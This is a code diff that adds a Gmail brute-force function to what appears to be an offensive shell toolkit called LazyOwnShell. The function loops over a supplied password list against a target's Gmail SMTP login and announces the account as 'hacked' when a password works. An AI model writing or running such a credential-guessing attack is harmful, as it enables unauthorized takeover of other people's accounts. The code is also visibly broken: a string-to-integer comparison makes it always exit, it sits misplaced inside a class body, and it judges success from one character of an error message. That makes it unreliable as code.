@@ -350,6 +350,57 @@ class LazyOwnShell(Cmd):
         for param, value in self.params.items():
             print_msg(f"{param}: {value}")
 
+def do_bfgmail(line, self):
+    """
+    This function attempts to brute force a Gmail account using a list of passwords.
+    
+    Args:
+    line (str): Placeholder for the line argument (not used in this context).
+    self (object): Placeholder for the self argument (not used in this context).
+    
+    The function prompts the user to provide the path to a password file and the target email. 
+    It then iterates over the passwords, trying to login via SMTP to Gmail. If a password is 
+    successful, it reports the success and terminates. Otherwise, it continues to the next password.
+    """
+    
+    print('[1] hcked @gmail')
+    print('[2] exit')
+    option = input('==>')
+    
+    if option == 1:
+        file_path = input('Path of passwords file: ')
+    else:
+        system('clear')
+        exit()
+
+    try:
+        with open(file_path, 'r') as pass_file:
+            pass_list = pass_file.readlines()
+    except IOError:
+        print("Error: File not found or can't be opened.")
+        return
+    
+    user_name = input('Target email: ')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+
+    for i, password in enumerate(pass_list, 1):
+        print(f'{i}/{len(pass_list)}')
+        try:
+            server.login(user_name, password.strip())
+            system('clear')
+            print('\n[+] This Account Has Been Hacked. Password: ' + password.strip() + '     ^_^')
+            break
+        except smtplib.SMTPAuthenticationError as e:
+            error = str(e)
+            if error[14] == '<':
+                system('clear')
+                print(f'[+] This account has been hacked, password: {password.strip()}     ^_^')
+                break
+            else:
+                print(f'[!] Password not found => {password.strip()}')
+
+
     def do_list(self, line):
         """
         Lists all available scripts in the modules directory.
